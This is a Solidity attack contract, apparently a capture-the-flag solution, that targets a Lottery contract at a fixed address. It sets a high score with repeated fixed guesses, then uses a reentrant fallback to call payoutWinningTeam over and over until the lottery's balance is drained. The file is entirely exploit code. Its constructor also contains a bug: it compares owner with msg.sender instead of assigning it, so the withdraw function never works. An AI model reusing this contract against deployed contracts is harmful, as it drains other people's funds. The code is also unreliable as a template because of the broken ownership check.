//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.6.0;

import "./Lottery.sol";

contract LotteryAttack {
    Lottery l;

    address owner;
    uint256 balance;

    modifier onlyOwner {
        if (msg.sender == owner) {
            _;
        }
    }

    constructor() public {
        owner == msg.sender;
        l = Lottery(0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A);
    }

    function addTeam(address teamAddress_, string memory teamName_, string memory teamPass_) public {
        l.registerTeam.value(0.000000001 ether)(teamAddress_, teamName_, teamPass_);
    }

    function setHighScore() public {
        for (uint256 i; i < 6; i++) {
            l.makeAGuess(address(this), 1897);
        }
    }

    fallback() external payable {
        if (address(l).balance >= 1 ether) {
            l.payoutWinningTeam(address(this));
        }
    }

    function attack() external payable {
        require(msg.value == 0.000000001 ether);
        address(l).transfer(0.000000001 ether);
        l.payoutWinningTeam(address(this));
    }

    function withdraw(address payable _to) public onlyOwner {
        _to.transfer(address(this).balance);
    }

    function deposit() public payable {
        balance += msg.value;
    }
}